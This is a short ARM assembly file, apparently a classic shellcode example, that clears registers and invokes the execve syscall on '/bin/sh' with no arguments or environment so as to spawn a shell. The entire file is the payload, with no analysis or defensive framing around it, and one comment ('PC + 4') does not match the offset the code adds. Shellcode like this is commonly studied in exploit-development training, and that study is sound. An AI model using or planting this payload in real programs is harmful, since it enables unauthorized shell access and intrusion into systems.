.section .text
.global _start

_start:
    eor r0, r0                  @ clear out r0
    add r0, pc, #12             @ shell command is at PC + 4 (PC-relative)
    mov r1, #0                  @ command line arguments (NULL)
    mov r2, #0                  @ Environment (NULL)
    mov r7, #11                 @ Execve syscall
    svc #0

.ascii "/bin/sh\0"
    
